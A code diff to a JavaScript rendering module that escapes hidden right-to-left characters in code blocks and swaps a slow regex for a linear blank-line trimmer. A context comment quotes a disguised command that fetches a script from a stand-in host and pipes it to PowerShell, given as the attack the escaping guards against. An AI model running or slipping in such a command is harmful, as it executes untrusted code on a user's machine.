@@ -506,7 +506,22 @@ const RTL_TOO = { rightToLeft: true };
 // `echo ok # check; iwr https://evil/x | iex`, a harmless comment, for a command that runs the
 // download; so Copy takes the escapes too, and a shell gets `\u2067` literally, never a command the
 // person did not see.
-export const codeText = (text) => reveal(text, RTL_TOO).replace(/(?:\n[^\S\n]*)+$/, '');
+export const codeText = (text) => trimBlankTail(reveal(text, RTL_TOO));
+
+// The blank lines at a block's end, empty or of only whitespace, off; the last line that holds
+// anything keeps its own trailing spaces. A backward scan, linear: the regex it replaces,
+// unanchored at its start, was retried from every newline, so thousands of blank lines stalled the
+// render (#429).
+function trimBlankTail(s) {
+  let end = s.length;
+  for (let i = s.length - 1; i >= 0; i--) {
+    const c = s[i];
+    if (c === '\n') { end = i; continue; }
+    if (/\s/.test(c)) { continue; }
+    break;
+  }
+  return s.slice(0, end);
+}
 
 // An approval's whole message as its card draws it (#220): its literal text (parseApproval) with
 // what is not on screen as it runs, right-to-left letters included, as escapes.
